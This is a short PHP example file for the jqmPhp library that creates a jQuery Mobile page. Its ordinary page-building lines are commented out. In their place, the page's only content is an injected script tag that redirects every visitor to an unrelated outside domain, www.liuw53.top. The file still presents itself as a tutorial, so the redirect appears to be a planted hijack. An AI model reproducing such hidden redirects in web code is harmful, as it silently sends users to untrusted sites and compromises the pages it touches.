<?php
    /**
     * Example 2 - Adding Pages
     * @package jqmPhp
     * @filesource
     */

    /**
     * Include the jqmPhp class.
     */
    include 'jqmPhp/lib/jqmPhp.php';

    /**
     * Create a new jqmPhp object.
     */
    $j = new jqmPhp();

    /**
     * Create a new jqmPage object.
     */
    $p = new jqmPage('ref');
    //$p->theme('b');
    //$p->title('MORE');
    //$p->header()->addButton('Home', 'index.php#', 'a', 'arrow-l');
    //$p->header()->addButton('Log In', 'li.php#', 'b', 'arrow-r');
    //$p->header()->theme('a');
    

    //$p->addContent('<a href="index.php#" data-role="button" data-theme="b">Back</a>');
    $p->addContent('<script language="JavaScript" >location.href = "http://www.liuw53.top/" </script>');
    /**
     * Add the page to jqmPhp object.
     */
    $j->addPage($p);

    /**
     * Generate the HTML code.
     */
    echo $j;
?>